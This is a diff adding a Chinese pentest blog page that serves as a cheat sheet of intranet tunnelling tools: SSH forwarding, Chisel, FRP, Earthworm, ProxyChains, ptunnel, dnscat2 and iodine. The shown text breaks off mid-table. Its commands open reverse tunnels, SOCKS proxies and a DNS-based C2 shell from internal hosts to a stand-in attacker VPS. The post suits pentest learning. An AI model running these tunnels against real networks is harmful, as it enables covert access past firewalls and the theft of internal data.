@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="前言在内网渗透中，突破网络隔离、建立持久访问通道是核心挑战。由于防火墙、NAT 与 ACL 限制，直接访问内网通常不可行。隧道与代理技术通过在两端建立加密或伪装通道，将内网流量中继到外网，实现”内网穿透”。本文系统梳理渗透测试中常用的隧道手段，涵盖 SSH 端口转发、Chisel、FRP、Earthworm、ICMP&#x2F;DNS 隧道、iptables 转发及配套代理工具，并提供选型参考与实">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网穿透与隧道技术汇总">
+<meta property="og:url" content="https://congliang.github.io/Intranet-tunnel-proxy/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="前言在内网渗透中，突破网络隔离、建立持久访问通道是核心挑战。由于防火墙、NAT 与 ACL 限制，直接访问内网通常不可行。隧道与代理技术通过在两端建立加密或伪装通道，将内网流量中继到外网，实现”内网穿透”。本文系统梳理渗透测试中常用的隧道手段，涵盖 SSH 端口转发、Chisel、FRP、Earthworm、ICMP&#x2F;DNS 隧道、iptables 转发及配套代理工具，并提供选型参考与实">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-01-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.913Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Intranet-tunnel-proxy/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Intranet-tunnel-proxy/","path":"Intranet-tunnel-proxy/","title":"内网穿透与隧道技术汇总"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>内网穿透与隧道技术汇总 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-SSH-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-number">2.</span> <span class="nav-text">1. SSH 端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%8F%91%EF%BC%88-L%EF%BC%89"><span class="nav-number">2.1.</span> <span class="nav-text">1.1 本地转发（-L）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%8F%91%EF%BC%88-R%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">1.2 远程转发（-R）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E5%8A%A8%E6%80%81%E8%BD%AC%E5%8F%91%EF%BC%88-D%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">1.3 动态转发（-D）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Chisel-%E2%80%94-%E5%BF%AB%E9%80%9F%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93"><span class="nav-number">3.</span> <span class="nav-text">2. Chisel — 快速反向隧道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-FRP-%E2%80%94-%E9%AB%98%E6%80%A7%E8%83%BD%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="nav-number">4.</span> <span class="nav-text">3. FRP — 高性能内网穿透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Earthworm-EW-%E2%80%94-%E7%BB%8F%E5%85%B8-SOCKS5-%E7%BA%A7%E8%81%94"><span class="nav-number">5.</span> <span class="nav-text">4. Earthworm (EW) — 经典 SOCKS5 级联</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-ProxyChains-%E4%B8%8E-SocksCap"><span class="nav-number">6.</span> <span class="nav-text">5. ProxyChains 与 SocksCap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-ProxyChains%EF%BC%88Linux%EF%BC%89"><span class="nav-number">6.1.</span> <span class="nav-text">5.1 ProxyChains（Linux）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-SocksCap64%EF%BC%88Windows%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">5.2 SocksCap64（Windows）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-ICMP-%E9%9A%A7%E9%81%93-%E2%80%94-ptunnel"><span class="nav-number">7.</span> <span class="nav-text">6. ICMP 隧道 — ptunnel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-DNS-%E9%9A%A7%E9%81%93"><span class="nav-number">8.</span> <span class="nav-text">7. DNS 隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-dnscat2%EF%BC%88%E9%AB%98%E9%9A%90%E8%94%BD%E6%80%A7%E3%80%81C2-%E4%B8%93%E7%94%A8%EF%BC%89"><span class="nav-number">8.1.</span> <span class="nav-text">7.1 dnscat2（高隐蔽性、C2 专用）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-iodine%EF%BC%88%E9%AB%98%E9%80%9F-DNS-%E9%9A%A7%E9%81%93%EF%BC%89"><span class="nav-number">8.2.</span> <span class="nav-text">7.2 iodine（高速 DNS 隧道）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-iptables-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="nav-number">9.</span> <span class="nav-text">8. iptables 端口转发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%E5%85%A8%E6%99%AF%E5%AF%B9%E6%AF%94"><span class="nav-number">10.</span> <span class="nav-text">9. 隧道技术全景对比</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%A7%E9%81%93%E9%80%89%E5%9E%8B%E5%86%B3%E7%AD%96%E6%B5%81%E7%A8%8B"><span class="nav-number">10.1.</span> <span class="nav-text">隧道选型决策流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-%E5%AE%9E%E6%88%98%E7%BB%84%E5%90%88%EF%BC%9A%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F"><span class="nav-number">11.</span> <span class="nav-text">10. 实战组合：多层内网穿透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-%E7%A8%B3%E5%AE%9A%E6%80%A7%E4%BC%98%E5%8C%96"><span class="nav-number">12.</span> <span class="nav-text">11. 稳定性优化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-%E5%85%8D%E8%B4%A3%E5%A3%B0%E6%98%8E"><span class="nav-number">13.</span> <span class="nav-text">12. 免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-number">14.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-tunnel-proxy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="内网穿透与隧道技术汇总 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          内网穿透与隧道技术汇总
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-01-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-01-05T08:00:00+08:00">2025-01-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在内网渗透中，突破网络隔离、建立持久访问通道是核心挑战。由于防火墙、NAT 与 ACL 限制，直接访问内网通常不可行。隧道与代理技术通过在两端建立加密或伪装通道，将内网流量中继到外网，实现”内网穿透”。本文系统梳理渗透测试中常用的隧道手段，涵盖 SSH 端口转发、Chisel、FRP、Earthworm、ICMP&#x2F;DNS 隧道、iptables 转发及配套代理工具，并提供选型参考与实战示例。</p>
+<hr>
+<h2 id="1-SSH-端口转发"><a href="#1-SSH-端口转发" class="headerlink" title="1. SSH 端口转发"></a>1. SSH 端口转发</h2><p>SSH 是最基础的隧道工具，几乎存在于所有 Linux&#x2F;Unix 系统。</p>
+<h3 id="1-1-本地转发（-L）"><a href="#1-1-本地转发（-L）" class="headerlink" title="1.1 本地转发（-L）"></a>1.1 本地转发（-L）</h3><p>将本地端口流量通过 SSH 转发到目标内网主机。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 本机 8080 → 跳板机 10.0.0.5 → 内网 192.168.1.100:80</span></span><br><span class="line">ssh -L 8080:192.168.1.100:80 root@10.0.0.5</span><br><span class="line"><span class="comment"># 访问 http://127.0.0.1:8080 即访问内网 Web</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2-远程转发（-R）"><a href="#1-2-远程转发（-R）" class="headerlink" title="1.2 远程转发（-R）"></a>1.2 远程转发（-R）</h3><p>将跳板机端口流量反向转发至本地内网——突破入站防火墙。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在内网主机执行：VPS 4444 → 内网 192.168.1.50:3389</span></span><br><span class="line">ssh -R 4444:192.168.1.50:3389 root@vps.example.com</span><br><span class="line"><span class="comment"># 在 VPS 上：rdesktop 127.0.0.1:4444</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配合 autossh 保活</span></span><br><span class="line">autossh -M 5555 -NfR 4444:192.168.1.50:3389 root@vps.example.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-动态转发（-D）"><a href="#1-3-动态转发（-D）" class="headerlink" title="1.3 动态转发（-D）"></a>1.3 动态转发（-D）</h3><p>本地启动 SOCKS5 代理，所有流量经 SSH 隧道动态路由。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1080 root@10.0.0.5</span><br><span class="line"><span class="comment"># 配合 ProxyChains：proxychains4 nmap -sT -Pn 192.168.1.0/24</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>常用参数：</strong> <code>-N</code>(不执行命令) <code>-f</code>(后台) <code>-T</code>(禁用伪终端) <code>-C</code>(压缩) <code>-g</code>(允许远程连接)</p>
+<hr>
+<h2 id="2-Chisel-—-快速反向隧道"><a href="#2-Chisel-—-快速反向隧道" class="headerlink" title="2. Chisel — 快速反向隧道"></a>2. Chisel — 快速反向隧道</h2><p><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">Chisel</a> 是 Go 编写的单二进制隧道工具，跨平台，适合无 SSH 环境的快速穿透。</p>
+<p><strong>反向 SOCKS5：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPS 服务端</span></span><br><span class="line">./chisel server -p 8000 --reverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内网客户端 → VPS 1080 即为 SOCKS5 入口</span></span><br><span class="line">./chisel client vps.example.com:8000 R:0.0.0.0:1080:socks</span><br></pre></td></tr></table></figure>
+
+<p><strong>反向端口映射（RDP 出网）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./chisel client vps.example.com:8000 R:3389:192.168.1.100:3389</span><br></pre></td></tr></table></figure>
+
+<p><strong>多层穿透：</strong> 边界主机 <code>R:1080:socks</code> → 深层主机 <code>./chisel client 192.168.1.50:1080 socks</code></p>
+<hr>
+<h2 id="3-FRP-—-高性能内网穿透"><a href="#3-FRP-—-高性能内网穿透" class="headerlink" title="3. FRP — 高性能内网穿透"></a>3. FRP — 高性能内网穿透</h2><p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">FRP</a> 支持 TCP&#x2F;UDP&#x2F;HTTP&#x2F;HTTPS&#x2F;STCP，配置灵活，适合长稳代理。</p>
+<p><strong>服务端 frps.ini：</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="attr">token</span> = YourStrongToken123</span><br></pre></td></tr></table></figure>
+
+<p><strong>客户端 frpc.ini — TCP + SOCKS5：</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = vps.example.com</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = YourStrongToken123</span><br><span class="line"></span><br><span class="line"><span class="section">[tcp-rdp]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.<span class="number">1.100</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">3389</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">13389</span></span><br><span class="line"></span><br><span class="line"><span class="section">[socks5-proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">11080</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br></pre></td></tr></table></figure>
+
+<p>启动：<code>./frps -c frps.ini</code> &#x2F; <code>./frpc -c frpc.ini</code></p>
+<hr>
+<h2 id="4-Earthworm-EW-—-经典-SOCKS5-级联"><a href="#4-Earthworm-EW-—-经典-SOCKS5-级联" class="headerlink" title="4. Earthworm (EW) — 经典 SOCKS5 级联"></a>4. Earthworm (EW) — 经典 SOCKS5 级联</h2><p><strong>正向（目标外网可达）：</strong> <code>./ew -s ssocksd -l 1080</code>（攻击机直接 socks5:&#x2F;&#x2F;target_ip:1080）</p>
+<p><strong>反向（目标内网，穿透防火墙）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPS</span></span><br><span class="line">./ew -s rcsocks -l 1080 -e 8888</span><br><span class="line"></span><br><span class="line"><span class="comment"># 内网主机</span></span><br><span class="line">./ew -s rssocks -d vps.example.com -e 8888</span><br></pre></td></tr></table></figure>
+
+<p><strong>二级级联（深度内网无法出网）：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VPS</span></span><br><span class="line">./ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line"><span class="comment"># 边界主机 A（可出网，连接 VPS 与深层 B）</span></span><br><span class="line">./ew -s lcx_slave -d vps.example.com -e 8888 -f 192.168.100.50 -g 9999</span><br><span class="line"><span class="comment"># 深层主机 B（不可出网）</span></span><br><span class="line">./ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure>
+<p>拓扑：<code>攻击机 → VPS:1080 → 边界A:8888 → 深层B:9999 → 核心区域</code></p>
+<hr>
+<h2 id="5-ProxyChains-与-SocksCap"><a href="#5-ProxyChains-与-SocksCap" class="headerlink" title="5. ProxyChains 与 SocksCap"></a>5. ProxyChains 与 SocksCap</h2><h3 id="5-1-ProxyChains（Linux）"><a href="#5-1-ProxyChains（Linux）" class="headerlink" title="5.1 ProxyChains（Linux）"></a>5.1 ProxyChains（Linux）</h3><p>通过 LD_PRELOAD 劫持 syscall，将任意程序 TCP 流量经过代理链。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/proxychains4.conf</span></span><br><span class="line">strict_chain</span><br><span class="line">proxy_dns</span><br><span class="line"><span class="section">[ProxyList]</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 192.168.1.0/24</span><br><span class="line">proxychains4 msfconsole</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>注意：</strong> 无法代理 ICMP&#x2F;SYN，Nmap 必须用 <code>-sT</code>（全连接扫描）。</p>
+</blockquote>
+<h3 id="5-2-SocksCap64（Windows）"><a href="#5-2-SocksCap64（Windows）" class="headerlink" title="5.2 SocksCap64（Windows）"></a>5.2 SocksCap64（Windows）</h3><p>通过 Hook WinSock 将程序流量重定向至 SOCKS。将目标程序（mstsc.exe、浏览器）拖入启动即可。勾选 “Resolve DNS remotely” 防止 DNS 泄漏。替代方案：Proxifier、Netch。</p>
+<hr>
+<h2 id="6-ICMP-隧道-—-ptunnel"><a href="#6-ICMP-隧道-—-ptunnel" class="headerlink" title="6. ICMP 隧道 — ptunnel"></a>6. ICMP 隧道 — ptunnel</h2><p>当防火墙仅放行 ICMP 时，将 TCP 数据封装在 ICMP Echo 载荷中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端（VPS）</span></span><br><span class="line">ptunnel -x StrongPass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端（内网）— 将 VPS 2222 映射到内网 192.168.1.100:22</span></span><br><span class="line">ptunnel -p vps.example.com -lp 2222 -da 192.168.1.100 -dp 22 -x StrongPass</span><br><span class="line"><span class="comment"># ssh root@127.0.0.1 -p 2222 即可连接</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>速度慢（每个包需等待 reply），适合 Shell 交互，不适合大文件传输。</p>
+</blockquote>
+<hr>
+<h2 id="7-DNS-隧道"><a href="#7-DNS-隧道" class="headerlink" title="7. DNS 隧道"></a>7. DNS 隧道</h2><p>DNS 隧道是仅 UDP 53 放行时的最后手段——将数据封装在 DNS 请求&#x2F;响应中。</p>
+<h3 id="7-1-dnscat2（高隐蔽性、C2-专用）"><a href="#7-1-dnscat2（高隐蔽性、C2-专用）" class="headerlink" title="7.1 dnscat2（高隐蔽性、C2 专用）"></a>7.1 dnscat2（高隐蔽性、C2 专用）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端</span></span><br><span class="line">dnscat2-server your-domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端（Linux）</span></span><br><span class="line">./dnscat2 --dns server=vps.example.com,domain=your-domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端（Windows PowerShell）</span></span><br><span class="line">Start-Dnscat2 -Domain your-domain.com -DNSServer vps.example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接后</span></span><br><span class="line">session -i 1                    <span class="comment"># 交互 Shell</span></span><br><span class="line">listen 127.0.0.1:4444 192.168.1.100:3389  <span class="comment"># 端口转发</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-iodine（高速-DNS-隧道）"><a href="#7-2-iodine（高速-DNS-隧道）" class="headerlink" title="7.2 iodine（高速 DNS 隧道）"></a>7.2 iodine（高速 DNS 隧道）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端（VPS，需 NS 记录指向本机）</span></span><br><span class="line">iodined -f -P SecretPass 10.0.0.1/24 tunnel.your-domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 客户端（内网，连接后获得 10.0.0.2）</span></span><br><span class="line">iodine -f -P SecretPass vps.example.com tunnel.your-domain.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接访问隧道对端：ssh root@10.0.0.2</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>工具</th>
+<th>速度</th>
+<th>隐蔽性</th>
+<th>适用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dnscat2</td>
+<td>~1-5 KB&#x2F;s</td>
+<td>高（加密）</td>
+<td>低速 C2、Shell</td>
+</tr>
+<tr>
+<td>iodine</td>
